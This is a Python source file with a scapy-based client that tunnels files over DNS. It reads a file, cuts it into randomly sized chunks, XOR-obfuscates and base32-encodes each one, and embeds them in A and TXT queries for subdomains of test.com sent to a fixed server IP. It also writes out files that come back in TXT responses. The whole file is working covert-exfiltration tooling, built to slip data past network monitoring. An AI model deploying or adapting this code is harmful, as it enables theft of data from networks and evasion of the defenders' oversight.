
import random, string
import base64
import time
import sys, socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 

class Client_side():
    
    def __init__(self):
        self._ipadd=socket.gethostbyname(socket.gethostname())
        self._counter=0
        self._flags=['0','0','0','0','0','0']
        print('flags=',self._flags)
        self._seq=hex(random.randint(16,255)) #2bytes random
        self._isn=self._seq
        print('ISN=',self._seq)
        self._id=hex(random.randint(1,15)) #1 byte random
        print('id=',self._id)
        self._tested=[1,1,1] #tested records
        '''infile=sys.argv[1]
        self.i=open(infile,'rb') 
        self._total=4000'''
        self._sum=0
        preshared='0x252'
        self._seed=self.generate_seed(preshared,self._isn)
        filenamet='rcvfile'+self._id+'.txt'
        self._rcvft=open(filenamet,'w')
        filenameb='rcvfile'+self._id
        self._rcvf=open(filenameb,'wb')
        self._serverhasdata=True
        self.file_input()
           
    def file_input(self):
        
        print('file_input started')
        file=sys.argv[1]
        self._total=int(os.stat(sys.argv[1]).st_size) #size of file
        if file.lower().endswith('.txt'):
            print('This file is txt')
            self._f=open(file,'r')
            self._ext='txt'
            
        else:
            print('This file is binary')
            self._f=open(file,'rb')
            self._ext='bin'
            
        self.chunkfiles()
        
    def chunkfiles(self):
        
        sendingtests=True
        #random length
        print('chunkfile is started')
        self._buffersize=random.randint(60,130)
        self._buffer=self._f.read(self._buffersize)
        
        #preparing packets for sending
               
        while len(self._buffer):
            print('********************************************************')
            print('buffer is', self._buffer,type(self._buffer))
            self._sum +=len(self._buffer)
            self.set_flags() #for detecting data type
            self._data=self._buffer
            self.encapsulation()
            self._buffersize=random.randint(60,130)
            self._buffer=self._f.read(self._buffersize)
            
        self._flags[5]='1'    
        '''if(self._sum<self._total): 
            self._buffer=self._f.read(self._total-self._sum)
            self._data=self._buffer
            #self._summ =self._total-self._sum
            self.encapsulation()'''
         #keep alive packets
        self._flags[0]='1' 
        self.sending_test()
        while(self._serverhasdata):
            self.sending_test()
            #if(self._serverhasdata==False):
            #if(self._qtype!='A'):
               #if self._rcvflags[5]=='1':
        print('total=',self._total,'sum=',self._sum)
               #sendingtests=False
        self._rcvf.close()
        self._rcvft.close()
        return #disconnecting connection
            
    
    def encapsulation(self):
        
        print('encap started')
        
        #seq numbers
        if(self._counter==0):
            self._seq=self._isn
        else:   
            xseq=int(self._seq,16)
            self._seq =hex(xseq+2)
        
        self._counter +=1 #one packet for sending
        flg=''.join(str(e) for e in self._flags)
        hd=flg+self._id+self._seq
        print('The header is',hd,'for packet num',self._counter)
        if(self._ext=='txt'):#type of data
            obfdata=self.obfuscation(self._data,self._seed)
            print('the obfuscated for txt data is',obfdata)
            finalstr=hd+obfdata
            print('the final str is=',finalstr)
            data=base64.b32encode(str(finalstr))
            print('the base32 coded data is=',data)
        else:
            obfdata=self.obfuscation(str(self._data),self._seed)
            print('the obfuscated for bin data is',obfdata)
            finalstr=hd+obfdata
            print('the final str is=',finalstr)
            data=base64.b32encode(str(finalstr))
            print('the base32 coded data is=',data)
            
        #selecting the size of records
        qn=self.formatting(data)
        print('the formatting data for sending is', qn)
        rand=random.randint(0,len(self._tested)-1)#selecting the type of sending record 
        if(rand==0):   self._qtype='A' 
        elif(rand==1): self._qtype='TXT' 
        else:self._qtype='TXT'   
        self._ans=sr1(IP(dst="20.0.0.7")/UDP()/DNS(rd=1,qd=DNSQR(qname=qn,qtype=self._qtype,qclass='IN')))
        self._counter +=1
        #receiving the response
        
        if(self._qtype !='A'):
            self.decapsulation()
            
                    
    def set_flags(self): #detect the data type
        print('setting flags started')
        
       #data record   
        if(self._ext=='txt'):
            self._flags[3]='1'
            self._data=self._buffer
        else:
            self._flags[3]='0'
            self._data=self._buffer
    
    def sending_test(self):
        
        self._data=''.join(random.choice(string.ascii_letters+string.digits) for i in range(20))
        self._ext='txt'
        self.encapsulation()
    
    def decapsulation(self):
        print('decap started')
        print('the query type is', self._qtype)
        
        rawdata=self._ans[DNSRR].rdata
        print('rdata part of query is=',rawdata)
        #if(self._qtype=='CNAME')
        rawdata=rawdata.rstrip('.')
        chunks=rawdata.split('.')
        leng=len(chunks)-1
        self._domain=chunks[leng-1]
        print('domain=',self._domain)
        self._tld=chunks[leng]
        print('tld=',self._tld)
        if 1==1: #self._domain=='test' and self._tld=='com': #matching condition
            data=""
            for i in range(0,leng-1):
                data+=chunks[i]
            print('The data part after omiting the domain and tld=',data)
            #qrtype =self._ans[DNSQR].sprintf("%qtype%")
            if self._qtype=='TXT':
                decodedata=base64.b64decode(data)
                decodestr=str(decodedata)
                print('the data after decoding in base64',decodestr)
            else:
                decodedata=base64.b32decode(data)
                decodestr=str(decodedata)
                print('the data after decoding in base32',decodestr)
                
            self._rcvflags=decodestr[0:6]
            self._rcvid=decodestr[6:9]
            self._rcvseq=decodestr[9:13]
              
             
            print('flag+id+seq',self._rcvflags,':',self._rcvid,':',self._rcvseq)
            
            
            #flags    
             #if a keep alive record
            if (self._rcvflags[5]=='1'):  
                self._serverhasdata=False
            if (self._rcvflags[0]=='0'):        
                #data
                self._rcvdata=self.obfuscation(decodestr[13:len(decodestr)],self._seed)
                print('The data after omiting seq and flags and id and de obfuscated',self._rcvdata)
                if(self._rcvflags[3]=='1'): #txt
                    print('the rcv data is in txt')
                    self._rcvft.write(self._rcvdata)  
                else:  
                    print('the rcv data is in bin') 
                    #bytesrcv=str.encode(self._rcvdata) #bin
                    self._rcvf.write(self._rcvdata)    
                 
        
    def formatting(self,st):
        print('formatting started')
        if(self._buffersize>=60 and self._buffersize<80):self._subsize=random.randint(10,50)
        elif(self._buffersize>=80 and self._buffersize<100):self._subsize=random.randint(30,50)
        else:self._subsize=random.randint(40,50)
        print('buffersize=',self._buffersize,'subsize=',self._subsize)
        chunks=[st[i:i+self._subsize] for i in range(0,len(st),self._subsize)]
        chunkdata='.'.join(str(e) for e in chunks)
        return (chunkdata+'.test.com') 
    
    def generate_seed(self,first,second):
        print('generating seed')
        sed = ""
        for character in first:
            for letter in second:
                character = chr(ord(character) ^ ord(letter))
            sed += character 
        print('seed='+sed)
        return sed 
      
    def obfuscation(self,data,sed):
         
        print('obfuscation started')
        random.seed(sed) 
        for i in range(1,self._counter+1): 
            randnum=random.random()
        print('the random number generated for packet',self._counter,'is',randnum)
        output=""
        for character in data:
            for letter in str(randnum):
                character = chr(ord(character) ^ ord(letter))
            output += character
        return output
        
def main():
    start_time = time.time()
    clientf=Client_side()
    print('fin')
    print("--- %s seconds ---" % (time.time() - start_time))

if __name__ == "__main__": main()             
        
    
        
            
